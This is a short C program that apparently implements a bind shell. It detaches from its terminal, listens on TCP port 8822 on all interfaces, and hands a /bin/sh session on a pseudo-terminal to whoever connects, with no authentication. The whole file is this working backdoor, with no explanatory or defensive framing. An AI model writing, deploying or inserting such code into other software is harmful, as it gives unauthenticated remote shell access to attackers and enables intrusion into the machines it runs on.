#include <pty.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <stdio.h>

#define LISTEN_BACKLOG 50

void write_(int fd, char * buffer, int size) {
    int done = 0;
    while (done < size) {
        int r = write(fd, buffer + done, size - done);
        if (r == -1) {
            perror("write failed");
            _exit(1);
        }
        done += r;
    }
}

int main(int argc, char ** argv) {
    int pid = fork();
    if (pid) {
        int status;
        waitpid(pid, &status, 0);
        return 0;
    }
    setsid();
    struct addrinfo hints;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_flags = AI_PASSIVE;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo * result;
    if (getaddrinfo(0, "8822", &hints, &result) == 0) {
        printf("getaddrinfo()\n");
    } else {
        printf("getaddrinfo() failed\n");
        _exit(1);
    }
    int socketfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (socketfd == -1) {
        perror("socket() failed");
        _exit(1);
    } else {
        printf("socket fd: %i\n", socketfd);
    }
    int option = 1;
    if (setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, (char *) &option, sizeof(option)) == 0) {
        printf("setsockopt()\n");
    } else {
        perror("setsockopt() failed");
        _exit(1);
    }
    if (bind(socketfd, result->ai_addr, result->ai_addrlen) == 0) {
        printf("bind()\n");
    } else {
        perror("bind() failed");
        _exit(1);
    }
    if (listen(socketfd, LISTEN_BACKLOG) == 0) {
        printf("listen()\n");
    } else {
        perror("listen() failed");
        _exit(1);
    }
    struct sockaddr peer_addr;
    socklen_t peer_addr_size;
    int acceptedfd = accept(socketfd, NULL, NULL);
    if (acceptedfd == -1) {
        perror("accept() failed");
        _exit(1);
    } else {
        printf("accepted fd: %i\n", socketfd);
    }

    if (fork()) {
        if (close(acceptedfd) == -1) {
            perror("close failed");
            _exit(1);
        }
    } else {
        close(socketfd);
        printf("hello, world\n");
        int master, slave;
        char buf[4096];
        openpty(&master, &slave, buf, NULL, NULL);
        if (fork()) {
            close(slave);
            int buffer_size = 4096;
            char * buffer = malloc(buffer_size);
            fcntl(master, F_SETFL, O_NONBLOCK);
            fcntl(acceptedfd, F_SETFL, O_NONBLOCK);
            while (1) {
                int r = read(master, buffer, buffer_size);
                if (r > 0) {
                    write(acceptedfd, buffer, r);
                } else if (r == 0) {
                    break;
                }

                r = read(acceptedfd, buffer, buffer_size);
                if (r > 0) {
                    write(master, buffer, r);
                } else if (r == 0) {
                    break;
                }
            }
            free(buffer);
            close(master);
            close(acceptedfd);
        } else {
            close(master);
            close(acceptedfd);
            setsid();
            int fd = open(buf, O_RDWR);
            close(fd);

            dup2(slave, 0);
            dup2(slave, 1);
            dup2(slave, 2);
            close(slave);
            execl("/bin/sh", "/bin/sh", NULL);
        }
    }
    return 0;
}
